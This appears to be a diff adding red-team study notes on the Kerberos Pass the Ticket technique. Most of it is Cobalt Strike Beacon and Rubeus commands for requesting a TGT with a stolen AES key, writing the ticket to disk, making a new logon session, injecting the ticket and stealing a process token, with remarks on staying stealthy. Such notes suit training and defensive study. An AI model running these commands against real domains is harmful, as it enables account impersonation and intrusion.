@@ -1,0 +1,55 @@
+_Pass the Ticket_ (or PtT), is a technique [T1550.003] that allows an adversary to leverage stolen, forged, or requested Kerberos tickets for user impersonation.
+
+PtT is superior to PtH in a few important aspects.  Kerberos authentication is not anomalous, nor is it restricted as with NTLM; and passing tickets into a logon session can be done with native Windows APIs, so it does not rely on patching LSASS memory.  This makes it more stealthy, and isn't prevented by PPL.
+
+## Requesting TGTs
+Adversary can also legitimately request Kerberos tickets on behalf of a user if they have their NTLM hash or AES encryption keys.  Using an NTLM hash will return RC4-encrypted tickets, which is generally not advisable.
+Rubeus' `asktgt` command can be used with a user's AES key.  This will return a ticket in base64 encoded format.
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:rsteel /domain:CONTOSO.COM /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960 /nowrap
+```
+
+## Injecting TGTs
+Beacon has a `kerberos_ticket_use` command, which imports the provided ticket into the current session.  The ticket must exist as a .kirbi file on the computer running the Cobalt Strike client.  If you have a base64 encoded ticket from Rubeus, you can write it to disk using PowerShell.
+```
+$ticket = "doIFo[...snip...]kNPTQ=="
+[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\rsteel.kirbi", [Convert]::FromBase64String($ticket))
+```
+If you pass a TGT into a logon session that already has one, then you'll overwrite the existing ticket.
+We want to avoid clobbering tickets as much as possible because, although we want to leverage the ticket, we don't want to impact the real user's access to services in the domain.
+
+The optimal strategy is to create a new logon session that we can impersonate.  This lets us use the Kerberos ticket, without affecting a user's existing logon session.
+Create a new logon session using `make_token`, providing a fake password (this assumes that we don't know the user's plaintext password).
+```
+beacon> make_token CONTOSO\rsteel FakePass
+```
+
+Running `klist` shows that our LUID changed, and there is no active token in our session. Next, `kerberos_ticket_use` will inject the given ticket into this new session.
+```
+beacon> kerberos_ticket_use C:\Users\Attacker\Desktop\rsteel.kirbi
+```
+
+If at any point you want to remove the tickets from this session, but without actually disposing of the session itself, use `kerberos_ticket_purge`.  When we no longer need the session, use `rev2self` to dispose of it, and the Beacon session goes back to pchilds' context.
+
+## The Rubeus way
+Rubeus' `ptt` command can inject tickets with the syntax: `ptt /luid:[luid] /ticket:[ticket]`.  The ticket parameter can be a base64 encoded ticket, or a path to a .kirbi on disk
+
+Rubeus also has a `createnetonly` command which can be used instead of Beacon's `make_token`.  This spawns a hidden process in a new logon session and returns the PID and LUID.
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\notepad.exe /username:rsteel /domain:CONTOSO.COM /password:FakePass
+```
+The process can be created and the ticket injected in a single command:
+```
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x132ef34 /ticket:doIFoDCCBZygAwIBBaEDAgEWooIEqjCCBKZhggSiMIIEnqADAgEFoQ0bC0NPTlRPU08uQ09NoQ=
+```
+Then steal the token of the spawned process to utilise the ticket.
+```
+steal_token 2524
+```
+To drop the impersonation, run `rev2self` and then terminate the spawned process using Beacon's `kill` command.
+
+
+
+
+
+
